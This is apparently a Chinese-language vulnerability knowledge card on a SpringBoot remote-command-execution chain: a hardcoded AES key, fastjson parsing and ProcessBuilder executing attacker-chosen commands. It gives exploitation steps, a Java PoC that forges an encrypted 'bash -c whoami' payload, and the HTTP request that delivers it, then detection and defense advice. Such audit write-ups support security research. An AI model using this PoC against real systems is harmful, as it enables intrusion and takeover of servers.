---
id: web-java-rce-aes-data-fastjson-shells-processbuilder
title: SpringBoot 硬编码 AES 加密 data 包 → fastjson 解析 sh.shells 数组 → ProcessBuilder 执行并加密回显 RCE
type: scenario
domain: web
path: web/java/rce
technique: encrypted-data-fastjson-shells-processbuilder-rce
aliases:
- DepotSynchro sync RCE
- deCryptAndDecode 解密命令执行
- sh.shells ProcessBuilder
- 加密请求体命令执行回显
- 硬编码 AES 密钥构造 payload
- Base64 AES SHA1PRNG 命令执行
tags:
- java
- springboot
- fastjson
- aes
- hardcoded-key
- processbuilder
- code-audit
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V633
  verified_at: '2026-11-13T00:50:24+08:00'
  notes: 已通读原文并逐张核对15张图（均为大图，读1200px缩略图）：图09 DepotSynchroServiceImpl.sync 将 data 经 deCryptAndDecode→JSONObject.parseObject→判断 sh 键→sh.shells 数组→ProcessUtil.execute(sh,charset)→resultJson.put(shRes)；图10 DataStrUtil 使用 Base64+AES/SHA1PRNG/128 与硬编码 KEY；图11/12/13 确认两入口 DepotSynchroContorller#sync 与 RuleSceneController#params（checkSign/SM.smDecrypt/_sync_data_）；图04 ProcessUtil 用 ProcessBuilder.command(shell)+redirectErrorStream(true)+convertStreamToStr 合并回显；图14 Burp POST /depotSynchro/sync（merchantId/time/isUpdated/data/version）返回 data=lBBVyg...；图15 解密得 {"shRes":"root\n"}，与卡内 PoC/响应一致。卡片 PoC 的密钥派生与原文 Test.java 完全一致；卡片将 charset 置于 sh 内（源码从 shObject 读取），原文示例置于顶层（代码读取为 null 仍可执行），两写法均可复现。dedup：top 候选 web-java-deser-fastjson-encrypted-param-aes-wrapper 同有加密包装但 sink 为 fastjson autoType（related/new），非同链；dup-scan 30 pair 无涉及；全库检索其余 AES/fastjson 卡均非同链。原文未给产品名/版本，affected_versions 留空。未验证点：未本机复跑；/params 入口仅按原文作者结论（两处均可 RCE）采信，未单独验证签名密钥。
---

## 一句话结论

当 SpringBoot 接口把请求中的 `data` 字段先 Base64 解码、再用源码中硬编码的 AES 密钥（`SHA1PRNG` 以该字符串为种子生成 128 位 key）解密，随后把明文交给 fastjson 解析，并从 `sh.shells` 数组取出命令交给 `ProcessBuilder` 执行、再把合并后的 stdout/stderr 加密回传时，拿到源码的攻击者可以离线复现加密，构造 `{"sh":{"shells":["bash","-c","whoami "]}}` 的密文提交，获得回显 RCE。

## 原理

- **加密只是编码而非认证**：`deCryptAndDecode(content)` 先 `Base64.decodeBase64`，再 `AES` 解密；密钥 `strKey` 硬编码在 `DataStrUtil`，`KeyGenerator.getInstance("AES")` + `SecureRandom.getInstance("SHA1PRNG")` + `random.setSeed(strKey.getBytes())` 使密钥生成完全确定，任何拿到源码/class 的人都能离线复现同一加解密过程。
- **解密后的数据被完全信任**：`DepotSynchroServiceImpl.sync(DepotSynchroDto)` 对解密得到的 JSON 直接 `JSONObject.parseObject(data)`，检查是否存在 `sh` 键，然后取 `sh.shells` 数组与 `charset`，拼成 `String[]` 传给 `ProcessUtil.execute(sh, charset)`。
- **Sink 是 ProcessBuilder**：`ProcessUtil.execute` 使用 `new ProcessBuilder().command(shell)`，`redirectErrorStream(true)`，启动后把 `process.getInputStream()` 经 `convertStreamToStr` 读成字符串返回；`sync` 把结果放进响应 `shRes` 字段，外层再次 AES 加密，形成命令回显。
- **攻击者视角**：只要找到接受该加密数据的入口（`DepotSynchroController#sync` 或 `RuleSceneController#params`），按同样的 KEY/算法加密任意命令数组即可，加密字段本身不提供任何防篡改保证。
- **为什么 shell 数组危险**：`ProcessBuilder` 不经过 shell，但数组第一个元素就是可执行文件，`["bash","-c","<cmd>"]` 等价于任意命令执行；业务本意可能只是执行固定同步脚本，却允许 JSON 完全指定命令与参数。

## 触发条件

- 攻击者能获取源码/字节码（源码泄露、供应链、内部人员、反编译），从而得到硬编码密钥与算法。
- 存在把请求字段解密后直接 fastjson 解析、并依据 JSON 内容执行命令的业务逻辑（本例 `sh.shells`）。
- 接口可达：`/depotSynchro/sync` 直接接收 `DepotSynchroDto`（条件较少）；`/params` 需通过 `checkSign` 签名校验，但签名密钥同样可在源码中取得。
- 服务进程有执行目标命令的权限（本例返回 `root`）。

## 利用步骤

1. 全局搜索 sink：`ProcessBuilder`、`Runtime.exec`、`ProcessUtil.execute`，回溯其参数来源；同时搜 `deCryptAndDecode`、`JSONObject.parseObject` 定位解密与解析点。
2. 从 `DataStrUtil` 提取 KEY、算法与派生方式（Base64 → AES/SHA1PRNG/128）。
3. 本地写 Java 类，用同一逻辑加密 JSON：`{"sh":{"shells":["bash","-c","whoami "]},"charset":"utf-8"}`，Base64 后作为 `data`。
4. POST 到 `/depotSynchro/sync`（或签名通过的 `/params`），请求体带 `merchantId`、`time`、`version`、`data`。
5. 取响应中的 `data`，用同一解密逻辑还原，得到命令输出（本例 `{"shRes":"root\n"}`）。
6. 进一步可执行反弹 shell、写 SSH key、注入内存马等持久化操作。

## PoC

密钥派生与加密（与源码一致的确定性实现）：

```java
String strKey = "mysecuritykey";
KeyGenerator kg = KeyGenerator.getInstance("AES");
SecureRandom random = SecureRandom.getInstance("SHA1PRNG");
random.setSeed(strKey.getBytes());
kg.init(128, random);
Cipher cipher = Cipher.getInstance("AES");
cipher.init(Cipher.ENCRYPT_MODE, kg.generateKey());
String payload = "{\"sh\":{\"shells\":[\"bash\",\"-c\",\"whoami \"],\"charset\":\"utf-8\"}}";
String data = Base64.encodeBase64String(cipher.doFinal(payload.getBytes("UTF-8")));
```

请求：

```http
POST /depotSynchro/sync HTTP/1.1
Content-Type: application/json

{"merchantId":"1000014","time":"22","isUpdated":"","data":"<上一步生成的 Base64>","version":"1.0"}
```

响应中的 `data` 字段解密后即命令输出。

## 变体与关联

- 另一入口 `RuleSceneController#params` 会先做 `checkSign(sign, data)` 与 `SM.smDecrypt`，但校验与密钥均在源码中，同样可离线构造；`_sync_data_` 为 true 时进入同一 `sync` 链。
- 解密后的 JSON 除 `sh` 外还有 `sql`、`globalCache`、`notify`、`env`、`rule-agent` 等分支，说明同一「信任解密数据」模式可能延伸出 SQL 执行、配置覆盖、SSRF 等其它 sink。
- 与 fastjson autoType 漏洞无关：此处只是用 fastjson 把 JSON 转成 `JSONObject`/DTO，风险在于业务把字段当命令。
- 关联：[[web-java-rce-processimpl-constructor-reflect-exec]]、[[web-java-rce-runtime-exec-string-tokenizer-bash-revshell]]（Java 命令执行 sink 的其它形态）。

## 检测与防御

- 不要把密钥硬编码在源码/配置中；加密参数必须配合签名（HMAC）与时效校验，密钥可轮换，防止离线构造。
- 解密后的数据按固定 schema 校验，只允许白名单字段与值；命令执行改用固定脚本/参数白名单，禁止用户输入进入 `ProcessBuilder` 命令数组。
- 审计时把 `ProcessBuilder`/`Runtime.exec` 作为 sink，反向追踪数据是否来自解密后的请求体；对 `deCryptAndDecode` 类工具方法同样纳入污点源。
- 检测：请求体 `data` 字段异常变化、命令进程（bash/sh/whoami）由 Java 进程派生、响应中加密字段的内容无法按业务解释。
- 响应：轮换密钥、修复接口鉴权与输入校验、排查主机是否已被写入后门/内存马。
